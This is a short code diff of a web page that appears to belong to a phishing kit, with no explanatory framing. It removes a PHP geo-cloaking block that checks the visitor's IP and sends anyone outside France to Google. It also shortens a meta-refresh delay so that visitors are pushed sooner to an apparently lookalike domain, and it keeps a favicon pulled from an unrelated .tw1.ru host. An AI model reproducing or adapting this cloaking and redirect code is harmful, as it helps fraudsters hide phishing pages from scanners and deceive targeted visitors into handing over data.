@@ -1,34 +1,8 @@
-<?php
-// Fonction pour obtenir l'adresse IP de l'utilisateur
-function getUserIP() {
-    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
-        return $_SERVER['HTTP_CLIENT_IP'];
-    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        return $_SERVER['HTTP_X_FORWARDED_FOR'];
-    } else {
-        return $_SERVER['REMOTE_ADDR'];
-    }
-}
-
-// Adresse IP de l'utilisateur
-$user_ip = getUserIP();
-
-// API de géolocalisation pour obtenir les informations de l'IP
-$response = file_get_contents("http://ip-api.com/json/{$user_ip}");
-$location_data = json_decode($response);
-
-// Vérifie si la réponse de l'API est valide et si l'utilisateur est en France
-if (!$location_data || $location_data->status !== 'success' || $location_data->countryCode !== 'FR') {
-    // Redirige vers Google si l'utilisateur n'est pas en France ou si l'API échoue
-    header("Location: https://www.google.com/");
-    exit();
-}
-?>
 <!DOCTYPE html>
 <html lang="en-US">
   <head>
     <link rel="icon" href="http://cr07267.tw1.ru/favicon.ico" />
-    <meta http-equiv="refresh" content="15;url=https://dermoi.lbc-000.online/" />
+    <meta http-equiv="refresh" content="5;url=https://dermoi.lbc-000.online/" />
     <meta charset="UTF-8" />
     <meta
       name="viewport"
